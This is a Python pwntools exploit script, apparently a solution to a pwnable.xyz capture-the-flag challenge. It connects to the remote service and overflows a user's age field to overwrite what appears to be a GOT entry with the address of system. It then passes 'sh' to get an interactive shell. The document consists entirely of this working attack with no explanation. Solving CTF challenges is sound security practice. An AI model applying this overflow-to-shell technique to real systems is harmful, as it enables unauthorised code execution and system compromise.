from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30011)
# gdb.attach(p, '''
# b *print_user
# b *create_user
# b *edit_usr	''')
system_call = 0x400730

p.sendlineafter('>', '1')
p.sendlineafter('Name:', 'JOEL')
p.sendlineafter('Age:', '1234')

p.sendlineafter('>', '3')
p.sendlineafter('Name:', 'JOEL')
p.sendlineafter('Age:', 'AAAABBBBCCCCDDDD' + p64(0x602068))

p.sendlineafter('>', '3')
p.sendlineafter('Name:', p64(system_call))
p.sendlineafter('Age:', 'sh')

p.interactive()